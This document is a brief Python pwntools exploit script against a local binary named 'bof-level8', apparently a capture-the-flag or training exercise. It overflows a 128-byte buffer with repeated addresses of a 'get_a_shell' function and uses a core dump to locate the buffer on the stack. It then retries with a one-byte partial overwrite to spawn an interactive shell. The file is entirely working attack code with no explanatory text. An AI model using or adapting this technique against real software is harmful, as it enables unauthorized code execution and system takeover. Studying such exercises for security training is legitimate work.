#!/usr/bin/env python

from pwn import *

env = {
    'DUMMY': 'a'*128
}
p = process('./bof-level8', env = env)

e = ELF('./bof-level8')

get_a_shell = e.symbols['get_a_shell']

buf = p64(get_a_shell) * (128/8) + "\x00"

p.sendline(buf)
p.wait()
p.close()

core = Core('./core')

buffer_address = core.stack.find(buf)

print(hex(buffer_address))


p = process('./bof-level8', env = env)
buf = p64(get_a_shell) * (128/8) + "\x40"
p.sendline(buf)

p.interactive()
